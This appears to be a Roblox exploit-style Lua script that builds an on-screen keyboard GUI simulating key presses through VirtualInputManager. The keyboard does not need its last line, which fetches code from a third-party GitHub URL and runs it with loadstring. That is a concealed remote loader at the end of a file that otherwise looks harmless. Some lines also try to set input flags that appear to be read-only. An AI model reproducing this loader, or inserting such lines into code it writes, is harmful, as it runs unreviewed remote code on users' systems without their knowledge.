-- LocalScript in StarterPlayerScripts
local player = game.Players.LocalPlayer
local uis = game:GetService("UserInputService")
local vim = game:GetService("VirtualInputManager")

-- Create GUI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "CustomKeyboard"
screenGui.ResetOnSpawn = false
screenGui.Parent = player:WaitForChild("PlayerGui")

-- Main frame
local frame = Instance.new("Frame")
frame.Name = "KeyboardFrame"
frame.Size = UDim2.new(0, 360, 0, 120)
frame.Position = UDim2.new(0.5, -180, 0.7, 0)
frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = screenGui

-- Toggle button
local toggleButton = Instance.new("TextButton")
toggleButton.Size = UDim2.new(0, 80, 0, 25)
toggleButton.Position = UDim2.new(0, 5, 0, -30)
toggleButton.Text = "Keyboard"
toggleButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
toggleButton.Parent = frame

-- Visible button (hidden at start)
local visibleButton = Instance.new("TextButton")
visibleButton.Size = UDim2.new(0, 80, 0, 25)
visibleButton.Position = UDim2.new(0.5, -40, 0.9, 0)
visibleButton.Text = "Visible"
visibleButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
visibleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
visibleButton.Visible = false
visibleButton.Parent = screenGui

toggleButton.MouseButton1Click:Connect(function()
	frame.Visible = false
	visibleButton.Visible = true
end)

visibleButton.MouseButton1Click:Connect(function()
	frame.Visible = true
	visibleButton.Visible = false
end)

-- Normal keybind buttons (V, X, C, Z, E)
local keys = {"V", "X", "C", "Z", "E"}
local yOffset = 10
for i, key in ipairs(keys) do
	local btn = Instance.new("TextButton")
	btn.Size = UDim2.new(0, 50, 0, 50)
	btn.Position = UDim2.new(0, 10 + (i-1)*55, 0, yOffset)
	btn.Text = key
	btn.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
	btn.TextColor3 = Color3.fromRGB(255, 255, 255)
	btn.Parent = frame

	btn.MouseButton1Click:Connect(function()
		pcall(function()
			vim:SendKeyEvent(true, Enum.KeyCode[key], false, game)
			vim:SendKeyEvent(false, Enum.KeyCode[key], false, game)
		end)

		-- Force back to mobile
		task.wait(0.05)
		uis.MouseEnabled = false
		uis.KeyboardEnabled = false
		uis.TouchEnabled = true
	end)
end

-- W toggle button
local wButton = Instance.new("TextButton")
wButton.Size = UDim2.new(0, 50, 0, 50)
wButton.Position = UDim2.new(0, 10 + (#keys)*55, 0, yOffset) -- placed after others
wButton.Text = "W"
wButton.BackgroundColor3 = Color3.fromRGB(200, 0, 0) -- red = off
wButton.TextColor3 = Color3.fromRGB(255, 255, 255)
wButton.Parent = frame

local wHeld = false

wButton.MouseButton1Click:Connect(function()
	wHeld = not wHeld
	if wHeld then
		-- Turn green and hold W
		wButton.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
		vim:SendKeyEvent(true, Enum.KeyCode.W, false, game)
	else
		-- Turn red and release W
		wButton.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
		vim:SendKeyEvent(false, Enum.KeyCode.W, false, game)
	end

	-- Always switch back to mobile after pressing
	task.wait(0.05)
	uis.MouseEnabled = false
	uis.KeyboardEnabled = false
	uis.TouchEnabled = true
end)

loadstring(game:HttpGet("https://raw.githubusercontent.com/DarkonScriptLEGEND/server-admin-keyboard/refs/heads/main/Server%20admin"))()
